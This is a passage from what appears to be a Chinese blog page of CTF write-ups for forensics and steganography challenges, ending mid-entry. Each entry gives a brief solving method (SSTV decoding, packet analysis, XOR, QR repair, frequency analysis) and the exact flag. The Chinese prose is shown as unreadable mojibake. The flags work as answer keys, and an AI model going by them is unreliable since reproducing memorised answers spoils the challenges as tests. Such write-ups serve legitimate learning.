id="INSHack2019-INSAnity"><a href="#INSHack2019-INSAnity" class="headerlink" title="[INSHack2019]INSAnity"></a>[INSHack2019]INSAnity</h3><p>Markdown æ–‡æ¡£ï¼Œæ‰“å¼€å³å¯çœ‹åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900597335/2005f8baa6df39651bb902bfebf35fb1d97d2f14.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSA&#123;YouRe_Crazy_and_I_Love_it&#125;</span><br></pre></td></tr></table></figure><h3 id="UTCTF2020-sstv"><a href="#UTCTF2020-sstv" class="headerlink" title="[UTCTF2020]sstv"></a>[UTCTF2020]sstv</h3><p>RX-SSTV æ¥æ”¶å¯å¾—å¦‚ä¸‹å›¾ç‰‡ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900635736/04d4d95bdd2b67339127922ad727fe597e402020.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">utflag&#123;6bdfeac1e2baa12d6ac5384cdfd166b0&#125;</span><br></pre></td></tr></table></figure><h3 id="INSHack2019-Sanity"><a href="#INSHack2019-Sanity" class="headerlink" title="[INSHack2019]Sanity"></a>[INSHack2019]Sanity</h3><p>Markdown æ–‡æ¡£ï¼Œæ‰“å¼€å³å¯çœ‹åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900689319/14a2388ca937d42475f73e637f7c9fafbc2b3f9d.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSA&#123;Welcome&#125;</span><br></pre></td></tr></table></figure><h3 id="INSHack2017-insanity"><a href="#INSHack2017-insanity" class="headerlink" title="[INSHack2017]insanity-"></a>[INSHack2017]insanity-</h3><p>Markdown æ–‡æ¡£ï¼Œæ‰“å¼€å³å¯çœ‹åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900723478/e0d488bdc4870f2ed0aa45f31b995604ba391b16.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSA&#123;Youre_crazy_I_like_it&#125;</span><br></pre></td></tr></table></figure><h3 id="GUET-CTF2019-520çš„æš—ç¤º"><a href="#GUET-CTF2019-520çš„æš—ç¤º" class="headerlink" title="[GUET-CTF2019]520çš„æš—ç¤º"></a>[GUET-CTF2019]520çš„æš—ç¤º</h3><p>è§£å‹å¾—åˆ°ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå°†å…¶ä¸ 0x33 åšå¼‚æˆ–è¿ç®—å¯ä»¥å¾—åˆ°ä¸€ä¸ª jpg å›¾åƒã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900776008/1be578e4ed4ffdf3645722305e5053bf5df38360.jpg"></p><p>æŸ¥è¯¢åŸºç«™çš„å®šä½å³å¯å¾—åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900827442/b661b9af66ce21820a9ed3c17c5e5ecc1b013936.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;æ¡‚æ—ç”µå­ç§‘æŠ€å¤§å­¦èŠ±æ±Ÿæ ¡åŒº&#125;</span><br></pre></td></tr></table></figure><h3 id="CFI-CTF-2018-webLogon-capture"><a href="#CFI-CTF-2018-webLogon-capture" class="headerlink" title="[CFI-CTF 2018]webLogon capture"></a>[CFI-CTF 2018]webLogon capture</h3><p>Wireshark åˆ†ææ•°æ®åŒ…ï¼Œçœ‹è¯·æ±‚å¯å¾—ä¸€ä¸²å­—ç¬¦ä¸²ï¼ŒURL Decode ä¹‹åå¯ä»¥å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CFI&#123;1ns3cur3_l0g0n&#125;</span><br></pre></td></tr></table></figure><h3 id="keyä¸åœ¨è¿™é‡Œ"><a href="#keyä¸åœ¨è¿™é‡Œ" class="headerlink" title="keyä¸åœ¨è¿™é‡Œ"></a>keyä¸åœ¨è¿™é‡Œ</h3><p>å°†è§£å‹å¾—åˆ°çš„å›¾ç‰‡ç”¨PhotoShop åè‰²ä¹‹åè¯†åˆ«äºŒç»´ç ï¼Œå¾—åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cn.bing.com&#x2F;search?q&#x3D;key%E4%B8%8D%E5%9C%A8%E8%BF%99%E9%87%8C&amp;m&#x3D;10210897103375566531005253102975053545155505050521025256555254995410298561015151985150375568&amp;qs&#x3D;n&amp;form&#x3D;QBRE&amp;sp&#x3D;-1&amp;sc&#x3D;0-38&amp;sk&#x3D;&amp;cvid&#x3D;2CE15329C18147CBA4C1CA97C8E1BB8C</span><br></pre></td></tr></table></figure><p>å°†å…¶ä¸­çš„ <code>m</code> å–å‡ºæ¥å¹¶æ•´ç†åˆ†ç»„ï¼Œç»è¿‡ <code>From Decimal --&gt; URL Decode</code> çš„è·¯å¾„è§£ç åå¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5d45fa256372224f48746c6fb8e33b32&#125;</span><br></pre></td></tr></table></figure><h3 id="å¾ˆå¥½çš„è‰²å½©å‘ƒï¼Ÿ"><a href="#å¾ˆå¥½çš„è‰²å½©å‘ƒï¼Ÿ" class="headerlink" title="å¾ˆå¥½çš„è‰²å½©å‘ƒï¼Ÿ"></a>å¾ˆå¥½çš„è‰²å½©å‘ƒï¼Ÿ</h3><p>è§£å‹å¾—åˆ°ä¸€å¼ å›¾ç‰‡ï¼Œå–è‰²å™¨çœ‹æ¯éƒ¨åˆ†é»„ç»¿è‰²çš„é¢œè‰²å¯çŸ¥åªæœ‰æœ€åä¸¤ä½æœ‰å·®åˆ«ï¼Œå› æ­¤å°†å…¶å–å‡ºæ¥ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900864440/95d17f13225e6bdbfe9d9471b82c5609799c8efa.png"></p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">61 61 70 6a 65 73</span><br></pre></td></tr></table></figure><p>å°†å…¶ä»åå…­è¿›åˆ¶è½¬åè¿›åˆ¶å³å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;aapjes&#125;</span><br></pre></td></tr></table></figure><h3 id="MRCTF2020-æ‘‡æ»šDJï¼ˆå»ºè®®å¤§å£°æ’­æ”¾"><a href="#MRCTF2020-æ‘‡æ»šDJï¼ˆå»ºè®®å¤§å£°æ’­æ”¾" class="headerlink" title="[MRCTF2020]æ‘‡æ»šDJï¼ˆå»ºè®®å¤§å£°æ’­æ”¾"></a>[MRCTF2020]æ‘‡æ»šDJï¼ˆå»ºè®®å¤§å£°æ’­æ”¾</h3><p>é™„ä»¶æ˜¯ä¸€æ®µéŸ³é¢‘ï¼ŒRX-SSTV æ¥æ”¶å¯ä»¥å¾—åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900920693/8a3d5f08de195348474c21d4fee1ddd1f8bd5d06.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">merak&#123;r3ce1ved_4n_img&#125;</span><br></pre></td></tr></table></figure><h3 id="INSHack2018-Self-Congratulation"><a href="#INSHack2018-Self-Congratulation" class="headerlink" title="[INSHack2018]Self Congratulation"></a>[INSHack2018]Self Congratulation</h3><p>é™„ä»¶æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œå·¦ä¸Šè§’æœ‰é»‘ç™½ç›¸é—´çš„æ–¹å—ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900961869/6847562ef70ff6d7a32b71f0f6bd943f4b1ca68e.png"></p><p>å°†å…¶è½¬è¯‘ä¸ºäºŒè¿›åˆ¶æ•°æ®å¾—åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">001100010011001000110011001101000011010100110110001101110011100000</span><br></pre></td></tr></table></figure><p>å»é™¤æ‰æœ€åä¸¤ä½ 00ï¼Œå¯ä»¥è½¬æˆ ASCII å­—ç¬¦ <code>12345678</code>ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;12345678&#125;</span><br></pre></td></tr></table></figure><h3 id="INSHack2018-INSanity"><a href="#INSHack2018-INSanity" class="headerlink" title="[INSHack2018]INSanity"></a>[INSHack2018]INSanity</h3><p>Markdown æ–‡æ¡£ï¼Œæ‰“å¼€å³å¯çœ‹åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900995822/847d10db3b3cc461ba9aec7e7f1afef6ec90e1e4.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSA&#123;let_the_game_begin!&#125;</span><br></pre></td></tr></table></figure><h3 id="ACTFæ–°ç”Ÿèµ›2020-frequency"><a href="#ACTFæ–°ç”Ÿèµ›2020-frequency" class="headerlink" title="[ACTFæ–°ç”Ÿèµ›2020]frequency"></a>[ACTFæ–°ç”Ÿèµ›2020]frequency</h3><p>è§£å‹å¾—åˆ°ä¸€ä¸ª word æ–‡æ¡£ï¼Œæ‰“å¼€å‘ç°éšè—æ–‡å­—ï¼ŒåŒæ—¶å…¶å¤‡æ³¨è¿˜æœ‰ä¸€ä¸²å­—ç¬¦ä¸²ã€‚å°†å…¶äºŒè€…æ‹¼åœ¨ä¸€èµ·ï¼Œç„¶å base64 è§£ç ã€‚å°†è§£ç åçš„å­—ç¬¦ä¸²è¿›è¡Œå­—é¢‘ç»Ÿè®¡ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">(&#39;1: &#39;, (&#39;a&#39;, 198))</span><br><span class="line">(&#39;2: &#39;, (&#39;c&#39;, 194))</span><br><span class="line">(&#39;3: &#39;, (&#39;t&#39;, 188))</span><br><span class="line">(&#39;4: &#39;, (&#39;f&#39;, 180))</span><br><span class="line">(&#39;5: &#39;, (&#39;p&#39;, 174))</span><br><span class="line">(&#39;6: &#39;, (&#39;l&#39;, 170))</span><br><span class="line">(&#39;7: &#39;, (&#39;o&#39;, 164))</span><br><span class="line">(&#39;8: &#39;, (&#39;k&#39;, 159))</span><br><span class="line">(&#39;9: &#39;, (&#39;m&#39;, 152))</span><br><span class="line">(&#39;10: &#39;, (&#39;i&#39;, 145))</span><br><span class="line">(&#39;11: &#39;, (&#39;j&#39;, 139))</span><br><span class="line">(&#39;12: &#39;, (&#39;n&#39;, 133))</span><br><span class="line">(&#39;13: &#39;, (&#39;u&#39;, 128))</span><br><span class="line">(&#39;14: &#39;, (&#39;h&#39;, 116))</span><br><span class="line">(&#39;15: &#39;, (&#39;b&#39;, 109))</span><br><span class="line">(&#39;16: &#39;, (&#39;y&#39;, 106))</span><br><span class="line">(&#39;17: &#39;, (&#39;g&#39;, 100))</span><br><span class="line">(&#39;18: &#39;, (&#39;v&#39;, 92))</span><br><span class="line">(&#39;19: &#39;, (&#39;r&#39;, 87))</span><br><span class="line">(&#39;20: &#39;, (&#39;d&#39;, 79))</span><br><span class="line">(&#39;21: &#39;, (&#39;x&#39;, 73))</span><br><span class="line">(&#39;22: &#39;, (&#39;e&#39;, 68))</span><br><span class="line">(&#39;23: &#39;, (&#39;s&#39;, 61))</span><br><span class="line">(&#39;24: &#39;, (&#39;z&#39;, 54))</span><br><span class="line">(&#39;25: &#39;, (&#39;w&#39;, 48))</span><br><span class="line">(&#39;26: &#39;, (&#39;q&#39;, 41))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">actf&#123;plokmijnuhbygvrdxeszwq&#125;</span><br></pre></td></tr></table></figure><h3 id="greatescape"><a href="#greatescape" class="headerlink" title="greatescape"></a>greatescape</h3><p>Wireshark åˆ†ææµé‡åŒ…ï¼ŒTCP æµé‡è·Ÿè¸ªåˆ°æµ 19 å¯ä»¥å‘ç° RSA ç§é’¥ï¼Œå°†å…¶ä¿å­˜ä¸‹æ¥ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213901042903/d6346f12c3a9c88a78e68580f226854d762d35f4.png"></p><p>å°†å¯†é’¥å¯¼å…¥ Wiresharkï¼Œè·Ÿè¸ª TLS æµåˆ° 80 å¯ä»¥åœ¨è¯·æ±‚ä¸­çœ‹åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213901088188/b3c6f4e3c0d50361b49af55c6e130ff2c752fb00.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INS&#123;OkThatWasWay2Easy&#125;</span><br></pre></td></tr></table></figure><h3 id="INSHack2019-gflag"><a href="#INSHack2019-gflag" class="headerlink" title="[INSHack2019]gflag"></a>[INSHack2019]gflag</h3><p>G Code æ–‡ä»¶ï¼Œä¸Šä¼ åˆ°<a href="https://gcode.ws/">åœ¨çº¿é¢„è§ˆçš„ç½‘ç«™</a>å¯ä»¥çœ‹åˆ°åŒ…å« flag çš„æ¸²æŸ“ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213901130598/5dffcc1a1b0671a3195f897175ce0f4082e995b6.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSA&#123;3d_pr1nt3d_fl49&#125;</span><br></pre></td></tr></table></figure><h3 id="GKCTF2020-Sail-a-boat-down-the-river"><a href="#GKCTF2020-Sail-a-boat-down-the-river" class="headerlink" title="[GKCTF2020]Sail a boat down the river"></a>[GKCTF2020]Sail a boat down the river</h3><p>è§†é¢‘ä¸­å¯è§ä¸€ä¸ªäºŒç»´ç ï¼Œæ‰«æåå¯å¾—åˆ°ä¸€ä¸ªç™¾åº¦ç½‘ç›˜é“¾æ¥ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213901238182/5fa3a3990cf5e2448d66f064d03e53ca94871f73.png"></p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1tygt0Nm_G5fTfVFlgxVcrQ</span><br></pre></td></tr></table></figure><p>æ ¹æ®è§†é¢‘ä¸­åˆ·å¡å™¨çš„é—ªçƒå¯ä»¥å¾—å‡ºæ‘©æ–¯ç”µç ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-.-- .-- ---.. --.</span><br><span class="line">yw8g</span><br></pre></td></tr></table></figure><p>ä¸‹è½½å¾—åˆ°æ•°ç‹¬æ–‡ä»¶ï¼Œå°†<a href="https://www.sudoku.name/sudoku-solver/cn">æ•°ç‹¬</a>è§£å‡ºå¯å¾—åˆ°å¯†é’¥ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213901273032/a322c46e86ae0dd8736f5a457b630c4d40ae6a54.png"></p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">52693795149137</span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213901311480/aab73ec297068da4ab6999de1f74932da51e73d5.png"></p><p>å°†æ˜æ–‡ä½œä¸ºå‹ç¼©åŒ…çš„è§£å‹å¯†ç å°†å…¶è§£å‹ã€‚ä½¿ç”¨ OverTure æ‰“å¼€è§£å‹å‡ºæ¥çš„è°±é¢ï¼Œå¯æ‰¾åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213901342028/790e8ba166fd7a129326a340fb05f32fe1119ab8.png"><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213901378336/c048f2656f343ebea824b2d9c8a6e42101252354.png"><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213901419786/ca38b687799ddb0c7bccabcf7302ea81843898ea.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;gkctf_is_fun&#125;</span><br></pre></td></tr></table></figure><h3 id="MRCTF2020-å°Oçš„è€ƒç ”å¤è¯•"><a href="#MRCTF2020-å°Oçš„è€ƒç ”å¤è¯•" class="headerlink" title="[MRCTF2020]å°Oçš„è€ƒç ”å¤è¯•"></a>[MRCTF2020]å°Oçš„è€ƒç ”å¤è¯•</h3><p>ç®€å• JavaScript ç®—ä¸€ä¸‹å¯ä»¥å¾—åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213901463899/bd3fe6cf9cd44fb44113cac2c6205445f85729b4.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;577302567&#125;</span><br></pre></td></tr></table></figure><h3 id="QCTF2018-X-man-Keyword"><a href="#QCTF2018-X-man-Keyword" class="headerlink" title="[QCTF2018]X-man-Keyword"></a>[QCTF2018]X-man-Keyword</h3><p>Cloacked Pixel å¯ä»¥è§£å‡ºéšè—çš„æ–‡å­—ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213901502506/66eb9df2b24b719271d4d67cb1852ce6054efece.png"></p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PVSF&#123;vVckHejqBOVX9C1c13GFfkHJrjIQeMwf&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ Nihilist å¯¹åº”çš„è§£ç å¯ä»¥å¾—åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213901540825/1d6a3e55c16b1832902fbb94c07ea4eb6ba0f072.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QCTF&#123;cCgeLdnrIBCX9G1g13KFfeLNsnMRdOwf&#125;</span><br></pre></td></tr></table></figure><h3 id="MRCTF2020-å¯»æ‰¾xxx"><a href="#MRCTF2020-å¯»æ‰¾xxx" class="headerlink" title="[MRCTF2020]å¯»æ‰¾xxx"></a>[MRCTF2020]å¯»æ‰¾xxx</h3><p>è§£å‹å¾—åˆ°ä¸€æ®µ DTMF éŸ³é¢‘ï¼Œä¸Šä¼ åˆ°åœ¨çº¿å·¥å…·å¾—åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213901579590/9cbc56d9d50918606189cae938fe6712faa8c64f.png"></p><p>ä¸€å¼€å§‹ä»¥ä¸ºè¿™å°±æ˜¯ flagï¼Œç»“æœæ˜¯è¦æŠŠæ•°å­—å‘ç»™å…¬ä¼—å·ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MRCTF&#123;Oh!!!!!_Y0u_f1nd_my_secret&#125;</span><br></pre></td></tr></table></figure><h3 id="Beautiful-Side"><a href="#Beautiful-Side" class="headerlink" title="Beautiful_Side"></a>Beautiful_Side</h3><p>è§£å‹æ‰€å¾—çš„å›¾ç‰‡æœ«å°¾è¿˜æœ‰ä¸€å¼  PNG å›¾åƒï¼Œæå–å‡ºæ¥ä¹‹åæ˜¯åŠä¸ªäºŒç»´ç ã€‚å…ˆå°†å…¶å®šä½ç è¡¥å…¨ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213901626376/b76a0ce618dfc068f942ade70e29ca8678cb8749.png"></p><p>å°†å…¶ä¸Šä¼ åˆ° <a href="https://merricx.github.io/qrazybox/">QRazyBox</a> å°è¯•ä¿®å¤äºŒç»´ç ã€‚åœ¨çº é”™ç­‰çº§ä¸ºé«˜ï¼Œé®æ©å±‚æ¨¡å¼ä¸º 2 çš„æ—¶å€™å‘ç°å¯ä»¥æˆåŠŸæå–å‡º flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213901670720/6b7bc458b03446f425cbda3a9a5ea61b02409c55.png"></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213901719109/fadfb4be54ef6f2ee1c9b22c2db8e1a6e01c74c5.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag&#123;OQWIC_4DS1A_S034S&#125;</span><br></pre></td></tr></table></figure><h3 id="XMAN2018æ’ä½èµ›-AutoKey"><a href="#XMAN2018æ’ä½èµ›-AutoKey" class="headerlink" title="[XMAN2018æ’ä½èµ›]AutoKey"></a>[XMAN2018æ’ä½èµ›]AutoKey</h3><p>Wireshark æ‰“å¼€å‘ç°æ˜¯ USB æµé‡åŒ…ï¼Œç¨å¾®è·Ÿä¸€ä¸‹å‘ç°è·Ÿé¼ é”®çš„å¾ˆåƒï¼Œäºæ˜¯ç”¨è„šæœ¬æå–å‡ºæ¥ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[+] Found : &lt;CAP&gt;a&lt;CAP&gt;utokey(&#39;****&#39;).decipheer(&#39;&lt;CAP&gt;mplrvffczeyoujfjkybxgzvdgqaurkxzolkolvtufblrnjesqitwahxnsijxpnmplshcjbtyhzealogviaaissplfhlfswfehjncrwhtinsmambvexo&lt;DEL&gt;pze&lt;DEL&gt;iz&#39;)</span><br></pre></td></tr></table></figure><p>æ•´ç†åå¾—åˆ°å¦‚ä¸‹å¯†æ–‡ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mplrvffczeyoujfjkybxgzvdgqaurkxzolkolvtufblrnjesqitwahxnsijxpnmplshcjbtyhzealogviaaissplfhlfswfehjncrwhtinsmambvexpziz</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-autokey-cipher/">åœ¨çº¿ç½‘ç«™</a>æä¾›çš„çˆ†ç ´è„šæœ¬ï¼Œå¯ä»¥è§£å‡ºå¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-674.914569565 autokey, klen 8 :&quot;FLAGHERE&quot;, HELLOBOYSANDGIRLSYOUARESOSMARTTHATYOUCANFINDTHEFLAGTHATIHIDEINTHEKEYBOARDPACKAGEFLAGISJHAWLZKEWXHNCDHSLWBAQJTUQZDXZQPF</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;JHAWLZKEWXHNCDHSLWBAQJTUQZDXZQPF&#125;</span><br></pre></td></tr></table></figure><h3 id="DDCTF2018-ç¬¬å››æ‰©å±•FS"><a href="#DDCTF2018-ç¬¬å››æ‰©å±•FS" class="headerlink" title="[DDCTF2018]ç¬¬å››æ‰©å±•FS"></a>[DDCTF2018]ç¬¬å››æ‰©å±•FS</h3><p>010 editor æ‰“å¼€å›¾ç‰‡å‘ç°æ–‡ä»¶æœ«å°¾æœ‰æœªçŸ¥åŒºå—ã€‚æå–å‡ºæ¥ä»”ç»†ç”„åˆ«å¯ä»¥çŸ¥é“æœ‰ä¸€ä¸ªå‹ç¼©æ–‡æ¡£ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213901761744/c3afa3c3011541f6c0d21460d25e3d172e2bfebb.png"></p><p>å°†å‹ç¼©æ–‡æ¡£æå–å‡ºæ¥ï¼Œå‘ç°éœ€è¦å¯†ç ã€‚åœ¨ FS.jpg çš„å¤‡æ³¨ä¸­å‘ç°äº†å­—ç¬¦ä¸² <code>Pactera</code>ï¼Œå°†å…¶ä½œä¸ºå¯†ç å¯ä»¥æˆåŠŸè§£å‹æ–‡æ¡£ã€‚æ ¹æ®æ–‡æ¡£å†…å®¹å¯çŒœæµ‹éœ€è¦åšé¢‘æ¬¡åˆ†æï¼Œäºæ˜¯åšé¢‘æ¬¡åˆ†æå¾—åˆ°å¦‚ä¸‹ç»“æœã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213901796742/ab15f3adbb878afe6d52dd98d3052e95b0b3c2fc.png"></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">- DDCTF&#123;huanwe1sik4o!&#125; //æˆ‘è¿™æ¬¡å¾—åˆ°çš„ flag</span></span><br><span class="line"><span class="addition">+ DDCTF&#123;x1n9shaNgbIci&#125; //ç½‘ä¸ŠæŸ WriteUp çš„ flag (æˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆäº¤è¿™ä¸ªæ˜¯å¯¹çš„)</span></span><br></pre></td></tr></table></figure><h3 id="INSHack2017-hiding-in-plain-sight"><a href="#INSHack2017-hiding-in-plain-sight" class="headerlink" title="[INSHack2017]hiding-in-plain-sight"></a>[INSHack2017]hiding-in-plain-sight</h3><p>binwalk å¯ä»¥å‘ç°è§£å‹å‡ºæ¥çš„å›¾ç‰‡é‡Œæœ‰å¤šå¼ å›¾ç‰‡ï¼Œäºæ˜¯ foremost å°†å…¶åˆ†ç¦»å‡ºæ¥ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213901837036/18bfd66fac06534b54fa0c08c4973b0b95216fc1.png"></p><p>å¾—åˆ°ä¸€å¼ åŒ…å« flag çš„å›¾ç‰‡ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213901876779/17587279cbb68bea9f5e9ff06a1632ac43083fbe.jpg"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSA&#123;l337_h4xx0r5_c0mmun1c473_w17h_PNGs&#125;</span><br></pre></td></tr></table></figure><h3 id="CFI-CTF-2018-CFI-in-Kotlin"><a href="#CFI-CTF-2018-CFI-in-Kotlin" class="headerlink" title="[CFI-CTF 2018]CFI-in-Kotlin"></a>[CFI-CTF 2018]CFI-in-Kotlin</h3><blockquote><p>skylot/jadx: <a href="https://github.com/skylot/jadx">https://github.com/skylot/jadx</a></p></blockquote><p>jadx 